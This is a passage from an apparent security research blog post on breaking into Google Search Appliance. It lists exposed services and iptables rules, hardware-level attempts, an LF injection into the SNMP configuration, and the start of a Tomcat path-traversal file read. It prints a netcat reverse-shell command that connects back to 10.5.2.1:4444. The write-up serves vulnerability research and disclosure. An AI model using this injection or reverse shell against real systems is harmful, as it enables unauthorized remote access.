      &lt;td&gt;sessionmanager&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12345&lt;/td&gt;
      &lt;td&gt;RegistryServer&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19780&lt;/td&gt;
      &lt;td&gt;configmgr/ent_configmgr.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;extract, transform and feed records&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;21200&lt;/td&gt;
      &lt;td&gt;FileSystemGateway&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;31300&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Despite the presence of so many services, most connections are blocked by iptables. 
The following are the iptables settings:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Redirect privileged ports.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# (we listen as nobody, which can&apos;t attach to low ports, so redirect to high ports)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 7800
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4430
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 444 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4431
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7800 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7801 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4430 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4431 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 19900 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9941 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9942 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 10999 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 68 &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 67 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 137:138 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 123 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 514 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 162 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The following summarizes the actual accessible TCP attack surface:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Program Location&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;/usr/sbin/sshd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/feedergate&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;/usr/sbin/stunnel&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;And we found that the strings in file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/export/hda3/versionmanager/google_key.symmetric&lt;/code&gt; can be used to decrypt the content of all install bundles! 
After gaining privileges using CVE-2014-6271 and decrypting the contents of the install bundle, 
our research on vGSA has temporarily concluded.&lt;/p&gt;

&lt;p&gt;But its lacks of memory protection might have some vulnerabilities that can be easily exploited.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gsa&quot;&gt;GSA&lt;/h3&gt;

&lt;p&gt;Upon booting the installed appliance and attempting to change the boot sequence,
we found that a password is required to enter the BIOS. 
Moreover, only some functions are accessible in the management interface of the Dell H700 RAID card:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, attempt to directly read the contents of the hard drive. 
If the hard drive content is not encrypted, there is a chance that the deviceâ€™s operating system and software can be obtained directly.
We found that its hard drive uses SAS interface for transmission. 
Before attempting, it is necessary to purchase a SAS HBA card. The LSI 9211-8i is used for connection in this test:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After connecting and attempting to read, it was discovered that this is a Self-Encrypting Drive (SED). 
It requires a password to unlock for access. OSSLab has a more detailed explanation here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.osslab.com.tw/ata-sed-security/&quot;&gt;https://www.osslab.com.tw/ata-sed-security/&lt;/a&gt; (chinese article)&lt;/p&gt;

&lt;p&gt;There are several ways to continue trying when the hard drive cannot be directly accessed:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Try to read the password in the BIOS EEPROM and change the boot order.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method requires damage to the motherboard and carries some risk. 
This method is only used when no vulnerabilities can be found at the software level.
More information: &lt;a href=&quot;https://blog.cybercx.co.nz/bypassing-bios-password&quot;&gt;https://blog.cybercx.co.nz/bypassing-bios-password&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Use PCILeech to read, write memory to gain system privileges.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method requires specific PCI-e devices, which were not prepared at the time. You can refer to this GitHub projectï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ufrisk/pcileech&quot;&gt;https://github.com/ufrisk/pcileech&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Look for software vulnerabilities that can access the service&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This method is simpler and more feasible.&lt;/p&gt;

&lt;h4 id=&quot;lf-injection-in-admin-console&quot;&gt;LF injection in Admin Console&lt;/h4&gt;

&lt;p&gt;After logging into the admin console, 
we observed a feature for obtaining system information through SNMP.
Additionally, this feature allows the insertion of custom strings.ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tried classic LF injection hereï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inject &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysContact&lt;/code&gt; with a LF and following command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After inserting the configuration value â€œextendâ€, 
we can use the command â€œsnmpwalkâ€ to trigger the SNMPâ€™s extend functionality and execute a shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Command executed successfully, and connected back with a shell.&lt;/p&gt;

&lt;h4 id=&quot;arbitrary-file-reading&quot;&gt;Arbitrary File Reading&lt;/h4&gt;

&lt;p&gt;From GSA 6.x series versions, we found that the 80/443 web services use Apache httpd in the RPM installation package. 
There are several http configurations located in /etc/httpd/conf.d/. 
In the files gsa-http.conf and gsaa-https.conf, certain directories are redirected to specific local services.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  RewriteEngine on
  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
  RewriteRule ^/dâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/(.*) http://localhost:7890/dps/dâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/$1 [P,L]
  RewriteRule ^/sâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/(.*) http://localhost:7890/dps/sâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/$1 [P,L]
  RewriteRule ^/vâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/(.*) http://localhost:7890/vâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ/$1 [P,L]
  RewriteRule ^/$ http://localhost:7800/ [P,L]
  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The communication ports 7886 and 7890 are services run by separate Apache Tomcat servers. 
When proxying two or more web servers, the path determination of Tomcat, ..;/, 
is an interesting test point. You can refer to the article written by our employee for more details:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The point weâ€™re interested in is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dps&lt;/code&gt;, which doesnâ€™t seem to be present in the old version of GSA. 
Extracting /WEB-INF/web.xml from dps.war allows us to inspect the web application configuration, and weâ€™ve found that the endpoint of /font will handled by
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;rootDirectory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;work/fonts/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;

  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/font/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And looking into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DPSDownloadServlet&lt;/code&gt;ï¼š&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.documill.dps.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.servlet.ServletContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSDownloadServlet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DownloadServlet&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSUserService&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DPSDownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRealPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servletcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;DPS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHomeDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DPSDownloadServlet:getRealPath:DPS home directory not specified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;nf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
